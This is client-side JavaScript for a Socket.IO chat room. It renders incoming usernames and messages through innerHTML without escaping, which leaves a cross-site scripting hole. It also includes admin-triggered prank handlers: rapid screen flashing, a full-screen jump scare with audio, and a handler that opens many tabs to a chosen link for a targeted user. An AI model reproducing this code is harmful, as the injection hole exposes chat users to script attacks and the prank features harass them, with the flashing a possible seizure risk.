const socket = io();

let username = localStorage.getItem('username');

if (!username) {
    window.location.href = '/login';
}

document.getElementById('sendButton').addEventListener('click', () => {
    const input = document.getElementById('messageInput');
    if (input.value.trim() !== '') {
        socket.emit('sendMessage', { username, message: input.value });
        input.value = '';
    }
});

document.getElementById('messageInput').addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('sendButton').click();
    }
});

socket.on('chatMessage', ({ username, message }) => {
    const box = document.getElementById('chatBox');
    const div = document.createElement('div');
    div.innerHTML = `<strong>${username}:</strong> ${message}`;
    box.appendChild(div);
    box.scrollTop = box.scrollHeight;
});

socket.on('announcement', ({ message }) => {
    alert(`Announcement: ${message}`);
});

socket.on('flashScreen', ({ duration }) => {
    const original = document.body.style.backgroundColor;
    let colors = ['red', 'blue', 'green', 'purple', 'yellow', 'pink', 'orange'];
    let count = 0;
    const interval = setInterval(() => {
        document.body.style.backgroundColor = colors[count % colors.length];
        count++;
    }, 200);
    setTimeout(() => {
        clearInterval(interval);
        document.body.style.backgroundColor = original;
    }, duration * 1000);
});

socket.on('jumpScare', ({ imageUrl, audioUrl }) => {
    const jumpscare = document.createElement('div');
    jumpscare.style.position = 'fixed';
    jumpscare.style.top = '0';
    jumpscare.style.left = '0';
    jumpscare.style.width = '100%';
    jumpscare.style.height = '100%';
    jumpscare.style.backgroundColor = 'black';
    jumpscare.style.display = 'flex';
    jumpscare.style.alignItems = 'center';
    jumpscare.style.justifyContent = 'center';
    jumpscare.style.zIndex = '9999';

    const img = document.createElement('img');
    img.src = imageUrl;
    img.style.maxWidth = '100%';
    img.style.maxHeight = '100%';

    jumpscare.appendChild(img);
    document.body.appendChild(jumpscare);

    const audio = new Audio(audioUrl);
    audio.play();

    setTimeout(() => {
        jumpscare.remove();
    }, 3000);
});

socket.on('spamTabs', ({ link, amount }) => {
    for (let i = 0; i < amount; i++) {
        window.open(link, '_blank');
    }
});

document.getElementById('flashButton').addEventListener('click', () => {
    const duration = parseInt(document.getElementById('flashDuration').value) || 3;
    socket.emit('adminFlash', { duration });
});

document.getElementById('announceButton').addEventListener('click', () => {
    const message = document.getElementById('announcementInput').value;
    socket.emit('adminAnnouncement', { message });
});

document.getElementById('jumpScareButton').addEventListener('click', () => {
    const imageUrl = document.getElementById('jumpImageUrl').value;
    const audioUrl = document.getElementById('jumpAudioUrl').value;
    socket.emit('adminJumpScare', { imageUrl, audioUrl });
});

document.getElementById('spamTabsButton').addEventListener('click', () => {
    const username = document.getElementById('targetUsername').value;
    const link = document.getElementById('spamLink').value;
    const amount = parseInt(document.getElementById('spamAmount').value) || 5;
    socket.emit('adminSpamTabs', { username, link, amount });
});
